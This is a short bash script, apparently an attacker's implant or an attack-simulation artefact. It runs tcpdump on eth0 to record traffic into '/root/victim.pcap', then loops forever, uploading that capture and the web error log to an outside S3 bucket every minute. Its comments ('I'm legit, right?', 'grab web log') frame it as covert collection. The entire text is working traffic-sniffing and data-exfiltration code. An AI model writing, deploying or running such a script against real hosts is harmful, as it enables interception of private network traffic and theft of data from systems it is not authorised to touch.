#!/bin/bash

# start PCAP; -U writes more frequently
/usr/sbin/tcpdump -i eth0 -U -w /root/victim.pcap '(tcp or udp) and not port 22 and not port 443' &

for (( ; ; )) # FOR EVER!
do
    sleep 60
    aws sts get-caller-identity > /tmp/awsident.txt # I'm legit, right?
    aws s3 cp /var/log/weberror.log s3://hammer-bucket8675309 # grab web log
    aws s3 cp /root/victim.pcap s3://hammer-bucket8675309 # and pcap
done
